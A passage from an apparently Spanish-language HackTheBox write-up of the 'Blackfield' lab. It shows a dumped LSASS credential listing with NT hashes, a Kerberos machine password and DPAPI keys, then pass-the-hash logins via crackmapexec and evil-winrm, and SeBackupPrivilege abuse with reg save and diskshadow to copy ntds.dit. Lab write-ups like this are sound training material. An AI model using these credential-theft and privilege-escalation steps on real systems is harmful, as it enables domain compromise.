		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>9d28]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 996 <span class="o">(</span>3e4<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>3e4]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: dc01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>5f5a]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406499 <span class="o">(</span>633e3<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	<span class="o">==</span> WDIGEST <span class="o">[</span>633e3]<span class="o">==</span>
		username svc_backup
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> DPAPI <span class="o">[</span>633e3]<span class="o">==</span>
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 366665 <span class="o">(</span>59849<span class="o">)</span>
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>59849]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>59839]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 256940 <span class="o">(</span>3ebac<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 136764 <span class="o">(</span>2163c<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 134935 <span class="o">(</span>20f17<span class="o">)</span>
session_id 0
username DC01<span class="err">$</span>
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.LOCAL

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 997 <span class="o">(</span>3e5<span class="o">)</span>
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username:
		Domain:

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 24405 <span class="o">(</span>5f55<span class="o">)</span>
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5f55]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	<span class="o">==</span> WDIGEST <span class="o">[</span>5ee6]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 24282 <span class="o">(</span>5eda<span class="o">)</span>
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	<span class="o">==</span> MSV <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	<span class="o">==</span> WDIGEST <span class="o">[</span>5eda]<span class="o">==</span>
		username DC01<span class="err">$</span>
		domainname BLACKFIELD
		password None
		password <span class="o">(</span>hex<span class="o">)</span>
	<span class="o">==</span> Kerberos <span class="o">==</span>
		Username: DC01<span class="err">$</span>
		Domain: BLACKFIELD.local
		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
</span></code></pre></div></div>

<ul>
  <li>Este usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> y tenemos sus <code class="language-plaintext highlighter-rouge">hash</code> NT.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">==</span> MSV <span class="o">==</span>
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
</code></pre></div></div>

<ul>
  <li>Vamos a validar que el hash sea correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d
</code></pre></div></div>

<ul>
  <li>Y vemos que si forma parte del grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
SMB         10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
HTTP        10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.23.192:5985/wsman
WINRM       10.129.23.192   5985   DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ya podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\s</span>vc_backup
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la <strong>flag</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
3920bb317a0bef51027e2852be64b543
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Tenemos el privilegio <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/5.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear un directorio <code class="language-plaintext highlighter-rouge">Temp</code> para desde allí hacer todo.</p>
  </li>
  <li>
    <p>Vamos a dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> pero de primeras no podemos hacer la copia por que no tenemos los suficientes privilegios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
Access to the path <span class="s1">'C:\Windows\NTDS\ntds.dit'</span> is denied.
At line:1 char:1
+ copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
</code></pre></div></div>

<ul>
  <li>Pero si queremos ver el hash primero necesitamos una copia de system para usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; reg save HKLM<span class="se">\s</span>ystem system
</code></pre></div></div>

<ul>
  <li>Podemos seguir los pasos como no lo dicen aquí <a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>zi.txt
<span class="nb">set </span>context persistent nowriters
add volume c: <span class="nb">alias </span>miguelito
create
expose %miguelito% z:
</code></pre></div></div>

<ul>
  <li>Ahora vamos a subirlo a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt
</code></pre></div></div>

<ul>
  <li>Pero no funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:01:46 PM

-&gt; <span class="nb">set </span>context persistent nowriter

SET CONTEXT <span class="o">{</span> CLIENTACCESSIBLE | PERSISTENT <span class="o">[</span> NOWRITERS <span class="o">]</span> | VOLATILE <span class="o">[</span> NOWRITERS <span class="o">]</span> <span class="o">}</span>

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program <span class="nb">exit</span>, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on <span class="nb">exit </span>or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Al parecer nos esta quitando la s de <code class="language-plaintext highlighter-rouge">nowriters</code> así que para evitar eso vamos añadir un espacio en cada línea del archivo.</p>
  </li>
  <li>
    <p>Vamos a volver a subirlo a la maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; erase zi.txt
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt

Info: Uploading /home/miguel/Hackthebox/Blackfield/content/zi.txt to C:<span class="se">\T</span>emp<span class="se">\z</span>i.txt

Data: 128 bytes of 128 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora si nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  4/20/2024 7:06:00 PM

-&gt; <span class="nb">set </span>context persistent nowriters
-&gt; add volume c: <span class="nb">alias </span>miguelito
-&gt; create
